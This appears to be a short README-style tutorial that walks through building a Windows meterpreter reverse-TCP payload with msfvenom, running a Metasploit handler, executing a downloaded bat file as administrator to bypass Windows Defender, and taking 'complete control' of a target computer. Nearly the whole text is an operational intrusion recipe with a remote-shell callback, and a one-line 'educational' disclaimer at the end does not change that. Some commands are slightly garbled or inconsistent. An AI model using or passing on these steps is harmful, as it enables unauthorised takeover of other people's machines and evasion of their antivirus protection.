# Defender
#author heritech
Step 1: Open the Kali Linux Terminal 
Click and run the terminal
Step 2: Create the Payload for Windows 10
In the terminal type:
mkdir Payload
cd Payload 
Then 
msfvenom -p windows/x64/meterpreter/reversetcp LPORT=8080 LHOST=your ip adress -o filename.exe_
LPORT=Your Port
LHOST=Your Ip Address
Filename.exe =Name It Any Name Of Your choice

With this commands we create the file with the payload

Step 3: Now You Need To Download This File To Bypass Windows Defender 

Step 4: In the terminal type this 
1:msfconsole
2:use exploit/multi/handler
3:set payload windows/meterpreter/reverse_tcp
set lhost Your Ip Address
set lport Your Port

Step 5:Transfer the File into the Target Computer

After we created our payload exe file we compress it to zip file. 
we must transfer the zip.file and the bat file we dowloaded in the target computer, 
so copy and paste the file into an USB stick, 
transfer the file into the computer and run our bat file as administrator.
then extract our zip file to exe and run as administrator.
Step 5:Then Lets Go Back To Our Kali Linux Terminal and Type 
exploit
 
Then You Have complete controll of the computer
Step 6:THIS GUIDE WAS CREATED FOR EDUCATIONAL AND PREVENTION PURPOSES
THANKS 
